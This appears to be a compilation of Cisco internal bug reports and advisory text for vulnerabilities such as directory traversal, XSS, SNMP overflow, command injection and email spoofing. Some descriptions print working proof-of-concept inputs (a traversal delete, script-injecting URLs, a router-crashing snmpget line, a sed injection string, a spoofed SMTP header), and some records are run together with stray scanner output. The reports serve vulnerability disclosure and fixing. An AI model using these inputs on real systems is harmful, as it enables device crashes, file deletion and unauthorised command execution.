Title: Hidden 'filesys delete' command does not properly restrict input
RNE: Symptom: Cisco NX-OS software contains a directory traversal vulnerability within the command line interface that could allow a local, authenticated attacker to delete arbitrary files on the affected device.  An attacker could leverage the NX-OS ?filesys delete? command to delete arbitrary files on the device.  This vulnerability affects the following platforms which are based on Cisco NX-OS: Cisco Nexus 7000 Cisco MDS 9000 Cisco Nexus 6000 Cisco Nexus 5500 Cisco Nexus 5000 Cisco Nexus 4000 Cisco Nexus 3500 Cisco Nexus 3000 Cisco Nexus 1000V Cisco Connected Grid Router 1000 Series Cisco Unified Computing System Fabric Interconnect 6200 Cisco Unified Computing System Fabric Interconnect 6100  Conditions: Device is running an affected version of Cisco NX-OS software.  Workaround: Restrict access to trusted users.  Further Problem Description: This issue was discovered during internal testing by Cisco.  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS scores as of the time of evaluation are : 4.6/4.4 http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:L/AC:L/Au:S/C:N/I:C/A:N/E:F/RL:U/RC:C&version=2.0  CVE ID CVE-2012-4135  has been assigned to document this issue.  Additional details about the vulnerability described here can be found at: http://tools.cisco.com/security/center/content/CiscoSecurityNotice/CVE-2012-4135  Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html
Description: 7K Defect: CSCty07270The file name restrictions on the hidden 'filesys delete' command can be bypassed using relative paths. The command apparently only allows the deletion of files in the /var/tmp directory, but this restriction can by bypassed using '../', e.g.:n7000# filesys delete /etc/passwdFiles are not supposed to be deleted from this directory n7000# filesys delete /var/tmp/../../etc/passwdPlease Wait.File is being deleted.Successfully deleted the file.Since this hidden command technically violates the 'SEC-CRE-NOBACK	No ?back doors?' requirement of the PSB it should be removed.

Title: Cisco Unified Communications Manager Cross Site Scripting Vulnerability
RNE: Symptom: A vulnerability in the web-based management interface of Cisco Unified Communications  Manager could allow an unauthenticated, remote attacker to conduct a cross-site  scripting (XSS) attack against a user of the web-based management interface of an  affected device.  The vulnerability is due to insufficient validation of user-supplied input by the  web-based management interface of an affected device. An attacker could exploit this  vulnerability by persuading a user of the interface to click a crafted link. A successful  exploit could allow the attacker to execute arbitrary script code in the context of  the interface or allow the attacker to access sensitive browser-based information.  Conditions: Device running with default configuration running an affected version of software.  This vulnerability is fixed in 10.5(2)su5 and 11.0(1a)su3.  Workaround: None.  Further Problem Description: Additional information about XSS attacks and potential mitigations can be found at:  http://www.cisco.com/en/US/products/cmb/cisco-amb-20060922-understanding-xss.html https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 3 score. The Base CVSS score as of the time of evaluation is 6.1: https://tools.cisco.com/security/center/cvssCalculator.x?version=3.0&vector=CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N/E:X/RL:X/RC:X  CVE ID CVE-2017-6654 has been assigned to document this issue.  Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html
Description: CUCM: XSS is possible on DNA ApplicationA recent webapp scan against DNA application revealed that it is vulnerable to XSS attacks.Below are the URLs which are vulnerable to the XSS attack.https://<CUCM IP>/dna/phone.do?updateCookie=true&lookup=false-alert%2852%29&multiple=truehttps://<CUCM IP>/dna/phone.do?updateCookie=true&lookup=false--%3E;%3C/script%3E%3Cscript%3Ealert(680)%3C/script%3E&multiple=truehttps://<CUCM IP>/dna/gateway.do?lookup=false&multiple=true--%3E;%3C/script%3E%3Cscript%3Ealert(954)%3C/script%3E&recCnt=0&colCnt=17However, it is not only limited to phone.do and gateway.do actions called via URL. Implement the fix across the DNA application. And also there are multiple ways to inject script elements into a web page. According to the previous bugs filed for CUCM applications for XSS attacks , it was considered to white list the characters passed in URL. Therefore, it is better to avoid blacklist-based solution.More guidance can also be found in the Cisco's Internal JIVE doc ;Defend Against Cross-Site Scripting (XSS); security recipe:https://cisco.jiveon.com/docs/DOC-844372

Title: Cisco IPS IP Logging Denial Of Service Vulnerability
RNE: Symptom: AnalysisEngine will report as 'NotRunning' in 'show version': AnalysisEngine     S-2012_AUG_24_05_31_7_1_5_3   (Release)   2012-08-24T05:40:50-0500   NotRunning Stack trace in 'core.txt' from 'show tech' will have 'writeEvent' in the stack. Title: Cisco PCA Default Account Credential Vulnerability
RNE: Symptom: A vulnerability in Cisco Prime Collaboration Assurance (PCA) Software could allow an unauthenticated, remote attacker to log in to the system shell with the default cmuser user account and access the shell with a limited set of permissions.      The vulnerability occurs because an undocumented account has a default and static password. This account is created at installation and cannot be changed or deleted without impacting the functionality of the system. The first time this account is used, the system will request that the user change the default password.      An attacker could exploit this vulnerability by remotely connecting to the affected system via SSH using the undocumented account. Successful exploitation could allow the attacker to access the system with the privileges of the cmuser user. This vulnerability allows the attacker to access some sensitive information such as the password file, system logs, and Cisco PCA database information; modify some data; run some internal executables; and possibly cause system instability or make the system inaccessible.      Cisco has released software updates that address this vulnerability. Workarounds are available.      This advisory is available at the following link: http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20151209-pca  Conditions: See Cisco Security Advisory  Workaround: See Cisco Security Advisory  Further Problem Description: PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS scores as of the time of evaluation are 9/7.8: http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:N/AC:L/Au:N/C:P/I:P/A:C/E:H/RL:OF/RC:C&version=2.0 CVE ID CVE-2015-6389 has been assigned to document this issue. Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html

However, it appears that ;/opt/mse/wips/bin/httpd; was overlooked.Checking the version:[root@mse2 ~]# /opt/mse/wips/bin/httpd -vServer version: Apache/2.2.21 (Unix)Server built:   May 15 2015 17:01:06We see that this shouldn't be a vulnerable version; however, the CVE also mentions a lack of the ;mod_reqtimeout; module. If we check for that:[root@mse2 ~]# /opt/mse/wips/bin/apachectl -L | grep -A 2 mod_reqtimeout[root@mse2 ~]#We do not find it.Further, if we look at the Unit-test attachment on CSCur74371, you can see that Steps 4 & 6 are simulating the attack. If we run this against the WIPS port (8082), it appears to fail the test.

Title: Crash in CISCO-SLB-EXT-MIB code
RNE: Symptom: The Simple Network Management Protocol (SNMP) subsystem of Cisco IOS and IOS XE Software contains multiple vulnerabilities that could allow an authenticated, remote attacker to remotely execute code on an affected system or cause an affected system to reload. An attacker could exploit these vulnerabilities by sending a crafted SNMP packet to an affected system via IPv4 or IPv6. Only traffic directed to an affected system can be used to exploit these vulnerabilities.  The vulnerabilities are due to a buffer overflow condition in the SNMP subsystem of the affected software. The vulnerabilities affect all versions of SNMP Versions 1, 2c, and 3. To exploit these vulnerabilities via SNMP Version 2c or earlier, the attacker must know the SNMP read-only community string for the affected system. To exploit these vulnerabilities via SNMP Version 3, the attacker must have user credentials for the affected system. A successful exploit could allow the attacker to execute arbitrary code and obtain full control of the affected system or cause the affected system to reload.  Cisco will release software updates that address these vulnerabilities. There are workarounds that address these vulnerabilities.  The advisory is available at the following link: https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20170629-snmp  Conditions: Devices running an affected version of Cisco IOS Software or Cisco IOS XE Software.  Workaround: Administrators are advised to allow only trusted users to have SNMP access on an affected system. Administrators are also advised to monitor affected systems by using the show snmp host command in the CLI.  In addition, administrators can mitigate these vulnerabilities by disabling the following MIBs on a device:      ADSL-LINE-MIB     ALPS-MIB     CISCO-ADSL-DMT-LINE-MIB     CISCO-BSTUN-MIB     CISCO-MAC-AUTH-BYPASS-MIB     CISCO-SLB-EXT-MIB     CISCO-VOICE-DNIS-MIB     CISCO-VOICE-NUMBER-EXPANSION-MIB     TN3270E-RT-MIB  To create or update a view entry and disable the affected MIBs, administrators can use the snmp-server view global configuration command, as shown in the following example:      snmp-server view NO_BAD_SNMP iso included     snmp-server view NO_BAD_SNMP internet included     snmp-server view NO_BAD_SNMP snmpUsmMIB excluded     snmp-server view NO_BAD_SNMP snmpVacmMIB excluded     snmp-server view NO_BAD_SNMP snmpCommunityMIB excluded     snmp-server view NO_BAD_SNMP ciscoMgmt.252 excluded     snmp-server view NO_BAD_SNMP transmission.94 excluded     snmp-server view NO_BAD_SNMP mib-2.34.9 excluded     snmp-server view NO_BAD_SNMP ciscoMgmt.35 excluded     snmp-server view NO_BAD_SNMP ciscoMgmt.95 excluded     snmp-server view NO_BAD_SNMP ciscoMgmt.130 excluded     snmp-server view NO_BAD_SNMP ciscoMgmt.219 excluded     snmp-server view NO_BAD_SNMP ciscoMgmt.254 excluded     snmp-server view NO_BAD_SNMP ciscoMabMIB excluded     snmp-server view NO_BAD_SNMP ciscoExperiment.997 excluded  To then apply this configuration to a community string, administrators can use the following command:       snmp-server community mycomm view NO_BAD_SNMP RO  For SNMP Version 3, administrators can use the following command:       snmp-server group v3group auth read NO_BAD_SNMP write NO_BAD_SNMP  Further Problem Description: Customer are advised to utilize the Cisco IOS Software Checker or Contact Cisco TAC to determine if fixed software has been released for an affected platform.  Cisco IOS Software Checker: http://tools.cisco.com/security/center/selectIOSVersion.x   PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 3 score. The Base CVSS score as of the time of evaluation is 8.8: https://tools.cisco.com/security/center/cvssCalculator.x?version=3.0&vector=CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H/E:X/RL:X/RC:X  CVE ID CVE-2017-6740 has been assigned to document this issue.  Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html
Description: It is possible to reliably crash a router by sending it a single packet. This sender only needs to know the snmp community read string. The crash can be triggered by issuing the following command on any system that supports the snmpget program:snmpget -v2c -c <read-pwd> <address> `python -c ;print '1.3.6.1.4.1.9.9.254.1.3.1.1.2.1.110%s'%('.1'*110);`The crash is caused by a overflowing a stack variable, potentially allowing an attacker to gain control of the cpu program counter. I have recreated the crash in 15.5(3)S1, and as far back as 12.2(33)SXI9. The same code is present in the 15.6 sources. This crash does not require any special configuration, the server load balancing code need only be present in the image.The crash occurs because the function slb_lam_snmp_lookup_natpool() in sys/casa/slb_laminar_nm.c creates a 81 byte buffer on the stack, and then blindly copies the entire incoming request into that buffer. There are quite a few slb_lam_snmp_lookup_xxx functions that all appear to suffer the same logic flaw. All of these callers to strcpy must validate that the length of the incoming string is less than the length of the destination buffer before doing the copy.
PSIRT: PSIRT-owner: xabrouck           PSIRT is reviewing this issue for possible inclusion in a Cisco Security  Advisory which could include this DDTs. Title: OpenSSH LoginGraceTime Denial of Service vulnerability CVE-2010-5107
RNE: Symptom: Cisco Email Security Appliances are affected by the OpenSSH issue described by CVE-2010-5107. This issue stems from the default values utilized for the  MaxStartups parameter as supplied by OpenSSH.  To be exploited an attacker would need to have the ability to open SSH connections to the SSH Management port on the affected device.  If successful, they attacker could consume all available SSH connection slots provided by the SSH Daemon. By reconnecting within the timeout period specified by the service the attacker could keep all connections consumed for an extended period of time. This would result in the inability to access the SSH management console by authorized users. Any users that were connected via SSH at the time of the attack would continue to operate as expected.  Conditions: Cisco Email Security Appliance devices running an affected version of ESA software.  Workaround: Administrators can mitigate this issue by restricting SSH access to trusted workstations and networks only.  Further Problem Description: Because this attack relies on long timers and timeouts, it creates very little resource strain on an affected device.  Only the connection pool for the SSH service is affected.  Once the attack stops users can connect to the device normally.  This issue will be remediated in a future release of Cisco ESA software by the implementation of an SSH Whitelist daemon that will auto filter out malicious SSH connections.  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS scores as of the time of evaluation are 5/4.8: http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:N/AC:L/Au:N/C:N/I:N/A:P/E:F/RL:U/RC:C&version=2.0  CVE ID CVE-2010-5107 has been assigned to document this issue.  Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html

Title: Wireless LAN Controller CDP Denial of Service Vulnerability
RNE: Symptom: A vulnerability in the Cisco Discovery Protocol (CDP) subsystem of Cisco Wireless LAN Controllers could allow an unauthenticated, adjacent attacker to cause a denial of service (DoS) condition..  The vulnerability is due to a failure to properly check for certain NULL values present in a CDP packet. An attacker could exploit this vulnerability by by submitting crafted CDP requests to an affected device. The attacker would then need to convince a user to preform an SNMP poll of the affected MIB.. An attacker that can convince a user to preform an SNMP poll of the affected MIB could trigger a NULL Pointer error that results in a restart of the device.  This vulnerability affects versions 7.5, 7.6.100.0, and 7.6.110.0 only.  Conditions: Cisco Wireless LAN Controller running an affected version of CDP software.  Workaround: Affected customers may disable CDP on the WLC as an intermediate workaround prior to updating the software on the device.  Further Problem Description: This defect is resolved in WLC version 7.6.120.0  An attacker would need direct Layer-2 access to an affected device.  This may also be triggered in circumstances where a non-Cisco switch that does  not parse CDP is utilized with a Cisco WLC.  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS scores as of the time of evaluation are 5.7/4.7: http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:A/AC:M/Au:N/C:N/I:N/A:C/E:F/RL:OF/RC:C&version=2.0  CVE ID CVE-2014-3291 has been assigned to document this issue.  Additional details about the vulnerability described here can be found at: http://tools.cisco.com/security/center/content/CiscoSecurityNotice/CVE-2014-3291  Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html

Title: ASA allows citrix  ICA connection without authentication
RNE: Symptom: Cisco ASA Clientless SSL VPN integration with Citrix includes the download of a .ica file from the Citrix server and serving this to the client. The .ica file includes a session token to connect to the Citrix server.  This file is stored on the client pc and deleted by the Citrix client once the session with Citrix is terminated.  If this file is copied on a different machine, it is possible to reuse this file to connect to the Citrix server via the Clientless SSL VPN feature without requiring authentication as far as the session of the user that initially authenticated to the Clientless SSL VPN Portal is still active.  Conditions: The file needs to be copied from the initial pc and the authenticated user session should still be active.  Workaround: none   PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS scores as of the time of evaluation are 2.6/2.5: http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:N/AC:H/Au:N/C:P/I:N/A:N/E:F/RL:U/RC:C&version=2.0 No CVE ID has been assigned to this issue. Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html  Further Problem Description:
Description: If a user connects to the portal and after that downloads an ICA file from a citrix server that is hosted behind the ASA , this file can be copied to a different machine and then can be used to access the citrix farm behind the ASA without authentication .

Title: Prime Services Catalog XML External Entity Processing Vulnerability
RNE: Symptoms: A vulnerability in the configuration of the XML parser of Cisco Prime Service Catalog could allow an authenticated, remote attacker to access sensitive data stored on the host operating system or cause system resource consumption that could cause a denial of service condition.  Cisco has released free software updates that address this vulnerability.  This advisory is available at the following link: http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20150128-psc-xmlee  Conditions: See published Cisco Security Advisory  Workaround: See published Cisco Security Advisory  Further Problem Description: PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS scores as of the time of evaluation are 7/6.7: http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:N/AC:M/Au:S/C:C/I:N/A:P/E:F/RL:U/RC:C&version=2.0  CVE ID CVE-2015-0581 has been assigned to document this issue.  Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html
Description: When a Prime Services Catalog user performs an action on an instance they control (for example, powering it off, rebooting it, or suspending it), their browser makes a SOAP request to the PSC server. This request consists of user-controllable XML that is parsed by the requisition service. The XML parser used has XML External Entity (XXE) support enabled, which allows the XML document to ask the parser to include external resources (such as files on the server's filesystem) in its content. By specially crafting an XML document, an attacker can exfiltrate arbitrary data from the server that hosts the Prime Services Catalog. This is achievable via a number of vectors (see attachment). Due the default behavior of how the Java XML parsers handle external entities, this can be used to retrieve directory listings as well as individual files. XML entities can also be used in application-layer denial-of-service attacks by crafting an entity that can be sent as a small number of bytes but expands to a large block of data in memory. This is frequently called the ``billion laughs attack.''3 The billion laughs payload is less than a kilobyte when transferred, but consumes almost 3GB of memory on the application server when parsed. Please see iSEC-Cisco-Nimbus-1 Details.pdf attachment for additional details.Please contact Kim Bonner, kibonner, for reproduction steps.

Title: (UCSM) CLI Command Injection Vulnerability
RNE: Symptom: A vulnerability in local-mgmt CLI of the Cisco Unified Computing System Manager could allow an authenticated, local attacker to perform a command injection attack.  The vulnerability is due to insufficient input validation for the affected command. An authenticated local attacker could exploit this vulnerability by injecting crafted command arguments into a vulnerable CLI command. An exploit could allow the attacker to execute arbitrary system commands with the privileges of the authenticated user  Conditions: This vulnerability is in all UCS-FI models.  All versions are vulnerable prior to the first fixed release.  Workaround: None  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 3 score. The Base CVSS score as of the time of evaluation is 5.3: https://tools.cisco.com/security/center/cvssCalculator.x?version=3.0&vector=CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L/E:X/RL:X/RC:X  CVE ID CVE-2017-6597 has been assigned to document this issue.  Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html  Further Problem Description:
Description: The ;clear sshkey; command in the local-mgmt shell allows unprivileged users to execute arbitrary system commands by manipulating arguments which are passed to sed, using sed's ;e; command. For example:clear sshkey ;/e touch \\/tmp\\/poc'  writable-file #;Where writable-file can be any non-empty file that the user has read and write access to. The command will then be executed for each line in the file.To prevent unexpected behavior, all arguments to shell commands should be validated to ensure they meet the expected format, preferably with a whitelist.This represents a regression or incomplete fix of CSCtq86559.

Title: Cisco Prime Data Center Network Manager Static Credential Vulnerability
RNE: Symptom: A vulnerability in Cisco Prime Data Center Network Manager (DCNM) Software could allow an  unauthenticated, remote attacker to log in to the administrative console of a DCNM server by using  an account that has a default, static password. The account could be granted root- or system-level  privileges.  The vulnerability exists because the affected software has a default user account that has a default,  static password. The user account is created automatically when the software is installed. An attacker  could exploit this vulnerability by connecting remotely to an affected system and logging in to the affected software by using the credentials for this default user account. A successful exploit could allow the attacker  to use this default user account to log in to the affected software and gain access to the administrative console  of a DCNM server.  Cisco has released software updates that address this vulnerability. There are no workarounds that address this vulnerability.  This advisory is available at the following link:  https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20170607-dcnm2  Conditions: Please refer to the Security Advisory.  Workaround: Please refer to the Security Advisory.  Further Problem Description: Please refer to the Security Advisory.  PSIRT Evaluation:  Credit: Cisco would like to thank security researcher Antonius Mulder from Commonwealth Bank of Australia for finding and reporting this vulnerability.  The Cisco PSIRT has assigned this bug the following CVSS version 3 score. The Base CVSS score as of the time of evaluation is 9.8: https://tools.cisco.com/security/center/cvssCalculator.x?version=3.0&vector=CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:X/RL:X/RC:X  CVE ID CVE-2017-6640 has been assigned to document this issue.  Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html

Title: Bypassing malware analysis in Cisco WSA
RNE: Symptom: A vulnerability in the proxy engine of the Cisco Web Security Appliance (WSA) could allow an unauthenticated, remote attacker to bypass the security restriction.  The vulnerability is due to improper handling of malformed HTTP methods. An attacker could exploit this vulnerability by crafting an improper HTTP method. An exploit could allow the attacker to circumvent the WSA's ability to prevent proxied network traffic.  Conditions: Device configured with default configuration.  Workaround: None.  Forthcoming fixed version will be v10.0 with an ETA of July-2016.  Further Problem Description: None.  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS scores as of the time of evaluation are 5/4.1: http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:N/AC:L/Au:N/C:N/I:P/A:N/E:F/RL:OF/RC:C&version=2.0 No CVE ID has been assigned to this issue. Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html
Description: I'm the author of the HTTP Evader tool, which can be used to automaticallydetect bypasses of the malware analysis of a firewall using uncommon or invalidHTTP responses. Since the public release of this tool I've got several plausiblereports, which indicate possible bypasses in the web filtering component in theCisco WSA Ironport product. The version as reported in the Via header of the HTTPresponse is Cisco-IronPort-WSA/7.7.0-753.The bypasses I've found include- The Disability to detect malware when Content-Encoding deflate is used.  For more details about this problem see  http://noxxi.de/research/http-evader-explained-2-deflate.html- Bypass by using a lower case HTTP version, i.e. ;http/1.1; instead of  ;HTTP/1.1; like in the following example:  | http/1.1 200 ok  | Content-length: ...  |  | undetected malwareSince this vulnerability report is based on tests done by users against mypublic test site and I only receive the results it might be possible that thisreport is wrong. But given that I've received such reports from multiple sourcesit is unlikely.I suggest that you test the product yourself by either using my public test siteor by installing the free tool in your private network. For more informationabout the tool and how to use it see http://noxxi.de/research/http-evader.html .Kind Regards, Steffen Ullrich

Title: Cisco Web Security Appliance Command Injection and Privilege Escalation Vulnerability
RNE: Symptom: A vulnerability in the web interface of the Cisco Web Security Appliance (WSA) could allow an authenticated, remote attacker to perform command injection and elevate privileges to root. The attacker must authenticate with valid administrator credentials.  The vulnerability is due to insufficient validation of user-supplied input on the web interface. An attacker could exploit this vulnerability by authenticating to the affected device and performing command injection over the web interface. An exploit could allow the attacker to elevate privileges from administrator to root.  Cisco has released software updates that address this vulnerability. There are no workarounds that address this vulnerability.  This advisory is available at the following link: https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20170719-wsa1  Conditions: Please refer to the security advisory.  Workaround: Please refer to the security advisory.  Further Problem Description: Please refer to the security advisory.  Credit: This vulnerability was found and reported to Cisco by Daniel Jensen from Security-Assessment.com.  PSIRT Evaluation:  The Cisco PSIRT has assigned this bug the following CVSS version 3 score. The Base CVSS score as of the time of evaluation is 7.2: https://tools.cisco.com/security/center/cvssCalculator.x?version=3.0&vector=CVSS:3.0/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H/E:X/RL:X/RC:X  CVE ID CVE-2017-6746 has been assigned to document this issue.  Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html

Title: Insufficient TCP options validation at 2nd normalizer in tcp_norm_parse_ts
RNE: Symptom: A vulnerability in the TCP normalizer of Cisco ASA Software could allow an authenticated, remote attacker to cause a reload of the ASA, resulting in a denial of service (DoS) condition.  The vulnerability is due to insufficient packet header validation at the 2nd stage normalizer in a dual normalizer setup. An attacker could exploit this vulnerability by sending a crafted TCP  packet across the ASA that passes the first stage normalizer at ingress, but is then corrupted while being redirected to e.g. Snort so that it has an invalid options header when it arrives at the  second stage normalizer at egress.  Conditions: Running ASA in a dual normalizer configuration.  Workaround: There are no workarounds that address this vulnerability.  Further Problem Description: ASA was crashing while it is processing the malformed TCP packet with an invalid options header. Due this ASA spends more time in TCP options processing and this is triggers the watch  dog, resulting in the crash.  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 3 score. The Base CVSS score as of the time of evaluation is 6.8: https://tools.cisco.com/security/center/cvssCalculator.x?version=3.0&vector=CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:C/C:N/I:N/A:H/E:X/RL:X/RC:X  The TCP header corruption would need to be caused on an internal data path, which would be extremely difficult for an attacker to trigger purposefully. Despite the CVSSv3 score of 6.8  Cisco is thus treating this as a low security impact vulnerability.  No CVE ID has been assigned to this issue.  Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html
Description: In dual normalizer case (normalizer is invoked at ingress and egress)  TCP packet options might get corrupted between the 1st and 2nd normalizer.  If the options are corrupted  and in the 2nd normaliser while parsing the invalid or un expected option we might land into a crash or unexpected behavior.  Need to validate and drop packets with invalid options fields with a proper drop reason.
PSIRT: PSIRT-owner: elparis@cisco.com           This issue has been evaluated and driven to closure by PSIRT. The value is ''https://10.106.22.133/images 2. CDATA[mod_ssl/2.2.24 appears to be outdated (current is at least 2.8.31) (may depend on server version) 3. Hostname 'sam-qa-10.cisco.com' does not match certificate's CN 'sam-qa-10' 4. CDATA[Allowed HTTP Methods: GET, HEAD, POST, OPTIONS  5. CDATA[mod_ssl/2.2.24 OpenSSL/FIPS - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell (difficult to exploit). CDATA[mod_ssl/2.2.24 OpenSSL/FIPS - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell (difficult to exploit). Title: Assurance-CSRF porting and code scan
RNE: Symptom: A vulnerability in the web interface of Cisco Prime Infrastructure could allow an unauthenticated, remote attacker to conduct a cross-site request forgery (CSRF) attack against the user of the web interface. The vulnerability is due to insufficient CSRF protections. An attacker could exploit this vulnerability by convincing the user of the affected system to follow a malicious link or visit an attacker-controlled website. A successful exploit could allow an attacker to submit arbitrary requests to the affected device via the affected web browser with the privileges of the user.  Conditions: An attacker could exploit this vulnerability by convincing the user of the affected system to follow a malicious link or visit an attacker-controlled website.  Workaround: none  Further Problem Description:  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS scores as of the time of evaluation are 4.3/3.6: http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:N/AC:M/Au:N/C:N/I:P/A:N/E:F/RL:OF/RC:C&version=2.0 CVE ID CVE-2015-6262 has been assigned to document this issue. The Base and Temporal CVSS scores as of the time of evaluation are 4.3/3.3: http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:N/AC:M/Au:N/C:N/I:P/A:N/E:U/RL:U/RC:UC&version=2.0 CVE ID CVE-2015-3185,CVE-2015-0228,CVE-2015-0253,CVE-2015-3183 has been assigned to document this issue. Description: The ap_some_auth_required function in server/request.c in the Apache HTTP Server 2.4.x before 2.4.14 does not consider that a Require directive may be associated with an authorization setting rather than an authentication setting, which allows remote attackers to bypass intended access restrictions in opportunistic circumstances by leveraging the presence of a module that relies on the 2.2 API behavior.

Title: Cisco Email Security Appliance Malformed Header Bypass Vulnerability
RNE: Symptom: A vulnerability in the Simple Mail Transfer Protocol (SMTP) header filtering functionality of Cisco AsyncOS Software for Cisco Email Security Appliances (ESA) could allow an unauthenticated, remote attacker to bypass configured user filters on the device.    The vulnerability is due to improper handling of a malformed SMTP header in an email received on an affected device. An attacker could exploit this vulnerability by sending an email containing a crafted SMTP header. A successful exploit could allow the attacker to bypass the configured ESA content filtering mechanisms allowing some email clients to display the malformed header information from the email message.  The Security Advisory is available at the following link: https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20171129-esa  Conditions: Please refer to the security advisory.  Workaround: Customers may elect to configure email authentication mechanisms such as Forged Email Detection (FED), Sender Policy Framework (SPF), Domain Keys Identified Mail (DKIM), and Domain-Based Message Authentication, Reporting, and Conformance (DMARC) checks to mitigate this vulnerability.  ESA configuration guides are at the following location: https://www.cisco.com/c/en/us/support/security/email-security-appliance/products-user-guide-list.html  Further Problem Description: https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20171129-esa  Credit: This vulnerability was reported to the Cisco PSIRT by Mai Ngoc Duong.  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 3 score. The Base CVSS score as of the time of evaluation is 5.8: https://tools.cisco.com/security/center/cvssCalculator.x?version=3.0&vector=CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:L/A:N/E:X/RL:X/RC:X  CVE ID CVE-2017-12353 has been assigned to document this issue.  Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html
Description: Our company are using the Cisco IronPort solution as Email Security Gateway to filter spam/virus/spoof incomming/outgoing email. Our company using domain: @company.com One of the methods we are using to filter spoof incomming email (an email from internet to internal user) is: remove the From header in the body of the messages (Please see attachment strip.png). Besides that, we still use other method like: check spf/dkim record.Today, when I try to send an email with Envelope From is admin@duongmn.com ( => pass spf check) and From header is admin@company.com (=> spoof From header) to hr@companycom (my internal user).MAIL FROM: admin@duongmn.comRCPT TO: hr@company.comDATASubject: Reset password emailFrom: admin@company.com....Normally, hr will recevie email with From header is: admin@duongmn.com (Because From removal will case the Envelope From value to automatically be written into the From filed).But if I use  a from header like that: from : admin@company.com (from with f in lower case and a space character after :). HR will receive email from admin@company.comMAIL FROM: admin@duongmn.comRCPT TO: hr@company.comDATASubject: Reset password emailfrom : admin@company.com....So I think an attacker can using trick (from : admin@company.com) to spoof From header, so I send this POC to Cisco PSIRT.

Title: Failure to drop privilege in firestarter.py
